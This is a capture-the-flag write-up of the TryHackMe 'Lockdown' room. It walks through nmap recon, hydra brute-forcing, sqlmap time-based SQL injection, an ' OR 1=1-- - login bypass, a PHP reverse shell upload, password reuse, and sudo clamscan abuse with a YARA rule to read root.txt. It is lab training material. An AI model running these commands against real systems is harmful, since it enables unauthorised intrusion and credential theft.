# Recon
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.229.15 -T5
```
<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Lockdown/assets/1.png">

# Enumeration
By browsing to ```http://10.10.229.15/``` we are redirected to ```http://contacttracer.thm/login.php```. We'll have to add ```contacttracer.thm``` to the ```/etc/hosts```.

We are welcomed by a blurry image and we can enter some sort of establishement code. BurpSuite didn't catch anything when intercepting the request so it looks like this does nothing.

We can however go to an admin login page.
```
http://contacttracer.thm/admin/login.php
```

Let's try bruteforcing the login page with user admin. We'll have to set the cookie with ```H=Cookie:NAME=VALUE```.
```
hydra -P /usr/share/wordlists/rockyou.txt contacttracer.thm http-post-form "/classes/Login.php:username=^USER^&password=^PASS^:Incorrect username or password:H=Cookie:PHPSESSID=11m05415frt3rffn1nrmr0m8i9" -T 64 -V -l admin
```

Hydra is probalby being blocked by protection. We'll now test the login for SQL injection by saving the login request and running it through sqlmap.
```
sqlmap -r req.txt --dump --dbs
```
Target is vulnerable but it uses a time-based payload. That means that the process is slow to prevent stressing the network. We do find some interesting tables and start enumerating those.
Finally we get a hash and after checking crackstation.net it tells us that it's ```sweetpandemonium```.

>Note: Another way is to just use ```' OR 1=1-- -``` on the login form.

We see that it is running CTS-QR version 1.0. A search on exploit-db tells us that this version is vulnerable to remote code execution.

> https://www.exploit-db.com/exploits/49604

But another way is to upload a reverse php shell at the system info page. If you then logout and browse to ```http://contacttracer.htm``` it will pop a shell as user ```www-data```.

As there is no obvious way to escalate our privileges we will try to reuse the password we cracked earlier. That worked for user ```cyrus```.

<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Lockdown/assets/2.png">

Running ```sudo -l``` shows us a script that can be run as root:

<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Lockdown/assets/3.png">

We see that the scripts scans files for virusses and gives user cyrus read permissions of the files in quarantine. We can use a YARA rule to let clamscan detect a file as a virus. As we're looking for the content of ```/root/root.txt`` we will use the following script:
```
rule CheckFileName
{
  strings:
    $a = "root"
    $b = "THM"
    
  condition:
    $a or $b
}
```
We will delete ```/var/lib/clamav/main.hdb``` and save our rule as ```rule.yara``` (using curl). Running the script with sudo will place root.txt in quarantine. And now we can view is as user cyrus.

<img src ="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/TryHackMe/Lockdown/assets/4.png">









